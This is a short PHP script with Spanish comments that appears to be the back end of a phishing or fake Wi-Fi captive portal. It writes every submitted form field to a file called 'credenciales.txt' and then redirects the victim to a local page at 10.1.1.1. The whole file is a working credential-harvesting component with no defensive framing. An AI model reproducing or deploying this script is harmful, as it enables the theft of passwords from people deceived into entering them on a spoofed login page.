<?php
// Definir la ruta del archivo
$file = 'credenciales.txt';

// Verificar si el archivo no existe, y crearlo si es necesario
if (!file_exists($file)) {
    // Crear el archivo si no existe
    $handle = fopen($file, 'w') or die('No se pudo crear el archivo.');
    fclose($handle);  // Cerrar el archivo inmediatamente después de crearlo
}

// Abrir el archivo en modo de anexado para agregar los datos
$handle = fopen($file, 'a');

// Recorrer los datos enviados por el formulario con POST y escribirlos en el archivo
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}

// Escribir una línea en blanco para separar las entradas
fwrite($handle, "\r\n");

// Cerrar el archivo
fclose($handle);

// Redirigir a una página de carga o confirmación
header('Location: http://10.1.1.1/index.html');
exit;
?>
